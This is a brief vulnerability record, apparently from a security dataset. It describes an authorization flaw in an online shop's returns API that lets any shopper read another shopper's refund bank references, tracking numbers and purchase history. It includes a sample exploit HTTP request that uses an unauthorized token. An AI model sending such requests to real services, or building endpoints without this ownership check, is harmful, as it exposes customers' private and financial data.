diagnosis: The e-commerce return workflow query allows shoppers to supply an arbitrary workflow_id and read carrier tracking numbers, refund bank account references, and item purchase histories without validating that the return workflow belongs to shopper.id.
exploit_request:
GET /returns/workflows/wf_return_ord_881920/timeline HTTP/1.1
Host: returns.shoponline.com
Authorization: Bearer <unauthorized_shopper_jwt>
